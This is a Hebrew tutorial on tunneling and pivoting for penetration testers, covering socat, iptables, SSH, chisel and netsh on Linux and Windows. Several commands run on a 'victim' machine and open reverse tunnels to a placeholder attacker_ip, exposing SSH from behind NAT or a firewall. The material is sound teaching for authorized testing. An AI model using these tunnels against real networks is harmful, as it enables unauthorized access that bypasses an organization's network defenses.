

בבדיקות חדירה, היכולת לטנל למחשבים שאותם אנחנו תוקפים על מנת להגיע לרשת הפנימית של הארגונים היא מיומנות קריטית.
על ידי שימוש בכלים כמו `socat`, `iptables`, `ssh` ו`chisel`, ניתן ליצור חיבורים לעקוף מגבלות, לבצע פיבוט בין מערכות ולשמור על גישה. הרצאה זו תסקור איך לבצע חיבור למערכות גם בסביבות Linux וגם ב-Windows, ותכלול דוגמאות מעשיות שיעזרו לכם להבין וליישם טכניקות אלו.

---

### חלק 1: חיבור למערכת Linux

#### 1.1 **Socat לחיבור**
הכלי **Socat** (SOcket CAT) הוא כלי חזק ליצירת טינול דו-כיווניים בין שתי נקודות קצה. הוא מאפשר לנו ליצור חיבורים מאובטחים, להעביר פורטים ולבצע משימות רשת.
##### דוגמה 1: יצירת חיבור בסיסי עם Socat

נניח שאנחנו צריכים להעביר תנועה ממחשב מקומי למחשב מרוחק, תוך עקיפת מגבלות רשת. במקרה זה, ניצור חיבור TCP ממחשב מקומי למחשב מרוחק:

- **המחשב המקומי (המתפקד כקליינט)**:

```bash
socat TCP4-LISTEN:1234,fork TCP4:target_ip:5678
```

- זה מקשיב על פורט `1234` באופן מקומי ומעביר כל תנועה לכתובת ה-IP של היעד על פורט `5678`.
	
- **המחשב המרוחק (המתפקד כשרת)**:

```bash
socat TCP4-LISTEN:5678,fork TCP4:localhost:22
```

- זה מקשיב על פורט `5678` ומעביר תנועה לפורט `22` (SSH) באופן מקומי על המחשב המותקף.
	

הגדרה פשוטה זו מאפשרת לנו להעביר תנועה בין פורטים שונים, ובכך לעקוף חומות אש או מגבלות מקומיות.

##### דוגמה 2: שימוש ב-Socat עבור חיבור SSH הפוך

חיבור הפוך שימושי כאשר התוקף צריך לגשת למחשב קרבן שנמצא מאחורי NAT או חומת אש.

- **מחשב התוקף**:

```bash
socat TCP4-LISTEN:8888,reuseaddr,fork TCP4:localhost:22
```

- **מחשב הקרבן**:

```bash
ssh -R 8888:localhost:22 user@attacker_ip
```


ההגדרה הזו מעבירה כל תנועה על פורט `8888` מהמחשב של התוקף לפורט `22` (SSH) על מחשב הקרבן, ויוצרת חיבור SSH הפוך.

#### 1.2 **IPTables לחיבור וסינון רשת**

הכלי `iptables` הוא כלי ניהול חומת אש עבור Linux שניתן להשתמש בו גם עבור סינון רשת והעברת פורטים. אפשר גם להשתמש בו להגדיר הפניית רשת או חיבור.

##### דוגמה 1: הפניית תנועה מפורט אחד לאחר

אם חומת אש חוסמת פורטים מסוימים, אפשר להשתמש ב-`iptables` כדי להפנות תנועה מפורט אחד לאחר.

- **הפניית תנועת פורט 80 לפורט 22** (SSH):

```bash
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 22
```

פקודה זו תופסת את כל התנועה על פורט `80` ומפנה אותה לפורט `22`. זה שימושי במיוחד כאשר חומת אש חוסמת SSH אך מאפשרת תנועת HTTP.


##### דוגמה 2: הפניית פורטים

אם אתה נמצא מאחורי NAT ורוצה להנגיש שירות (כגון SSH) לעולם החיצון, אפשר להחיות את הפורטים המקומיים באמצעות `iptables`.

- **הפניית תנועה נכנסת על פורט 2222 לפורט 22**:

```bash
iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 192.168.0.2:22
iptables -A FORWARD -p tcp -d 192.168.0.2 --dport 22 -j ACCEPT
```


הפקודה הזו מעבירה תנועה מפורט `2222` לפורט `22` על מחשב פנימי ספציפי (`192.168.0.2`).

#### 1.3 **חיבור SSH**

חיבור SSH מאפשר לנו להעביר תנועה ברשת בצורה מאובטחת דרך חיבור SSH מוצפן. זוהי אחת השיטות הנפוצות ביותר לחיבורים במהלך בדיקות חדירה.

##### דוגמה 1: יצירת חיבור SSH מקומי

אם אתה רוצה להעביר תנועה ממחשב מקומי למחשב מרוחק דרך חיבור SSH:

```bash
ssh -L 8080:localhost:80 user@target_ip
```

פקודה זו מחברת את `localhost:8080` במחשב המקומי ל-`localhost:80` במחשב היעד המרוחק. כל תנועה על פורט `8080` במחשב המקומי תועבר לפורט `80` על המחשב המרוחק דרך החיבור המוצפן.

##### דוגמה 2: יצירת חיבור SSH הפוך

חיבור SSH הפוך מאפשר למחשב המרוחק להתחבר חזרה למחשב המקומי שלך.

```bash
ssh -R 9999:localhost:8080 user@target_ip
```

פקודה זו יוצרת חיבור הפוך, שמקשיב על פורט `9999` במחשב המרוחק ומפנה תנועה לפורט `8080` במחשב המקומי שלך.

#### 1.4 **Chisel לחיבור**

הכלי `Chisel` הוא חיבור TCP/UDP מהיר, המשמש לעיתים קרובות לעקיפת חומות אש או NAT. הוא שימושי במיוחד כאשר יש הגבלות רשת מחמירות.

##### דוגמה 1: הגדרת שרת Chisel

- **שרת Chisel על מחשב התוקף**:

```bash
chisel server -p 8000 --reverse
```


##### דוגמה 2: הגדרת לקוח Chisel

- **לקוח Chisel על מחשב הקרבן**:

```bash
chisel client attacker_ip:8000 R:9000:localhost:22
```


פקודה זו יוצרת חיבור הפוך, ומפנה תנועה על פורט `9000` מהמחשב של התוקף לפורט `22` (SSH) על מחשב הקרבן.

### חלק 2: חיבור למערכת Windows

#### 2.1 **Socat עבור Windows**

כמו ב-Linux, ניתן להשתמש ב-`socat` גם ב-Windows ליצירת חיבורים בין מערכות. הוא דורש גרסה תואמת, והשימוש דומה לשימוש ב-Linux.

##### דוגמה 1: חיבור בסיסי עם Socat ב-Windows

- **מחשב Windows (המתפקד כשרת)**:

```bash
socat TCP4-LISTEN:8888,fork TCP4:localhost:22
```

- **מחשב התוקף**:

```bash
socat TCP4-LISTEN:1234,fork TCP4:target_ip:8888
```


זה מאפשר לתנועה לעבור מפורט `1234` במחשב התוקף לפורט `22` במחשב ה-Windows דרך פורט `8888` במחשב ה-Windows.

#### 2.2 **Netsh עבור הפניית פורטים**

הכלי `netsh` הוא כלי שורת פקודה ב-Windows המאפשר להגדיר ממשקי רשת, חוקים בחומת אש ועוד. ניתן להשתמש בו גם עבור הפניית פורטים וניהול תנועת רשת.

##### דוגמה 1: הפניית פורטים באמצעות Netsh

כדי להנחות תנועה מפורט `8080` במחשב Windows המקומי לפורט `80` במחשב מרוחק, השתמש בפקודה:

```bash
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=target_ip
```

הפקודה הזו אומרת למערכת להפנות תנועה מכל הממשקים (`0.0.0.0`) על פורט `8080` ל-`target_ip` על פורט `80`.

#### 2.3 **SSH ב-Windows**

הכלי SSH זמין גם ב-Windows, במיוחד עם Windows Subsystem for Linux (WSL) או התקנת OpenSSH. ניתן להשתמש בו בדיוק כמו ב-Linux.

##### דוגמה 1: חיבור SSH ב-Windows

- **מחשב התוקף**:

```bash
ssh -L 1234:localhost:80 user@target_ip
```


זה מעביר את פורט `1234` המקומי לפורט `80` במחשב Windows המרוחק.

#### 2.4 **Chisel עבור Windows**

הכלי `Chisel` הוא כלי עצמאי לפלטפורמות וניתן להשתמש בו בצורה דומה גם ב-Windows. הוא משמש לעיתים קרובות לעקיפת חומות אש או הגבלות NAT.

##### דוגמה 1: הגדרת שרת Chisel ב-Windows

- **שרת Chisel על מחשב התוקף**:

```bash
chisel server -p 8000 --reverse
```


##### דוגמה 2: הגדרת לקוח Chisel ב-Windows

- **לקוח Chisel על מחשב הקרבן**:

```bash
chisel client attacker_ip:8000 R:9000:localhost:22
```


הפקודה הזו יוצרת חיבור הפוך ממחשב הקרבן למחשב התוקף, ומפנה תנועה על פורט `9000` לפורט `22` (SSH) במחשב הקרבן.
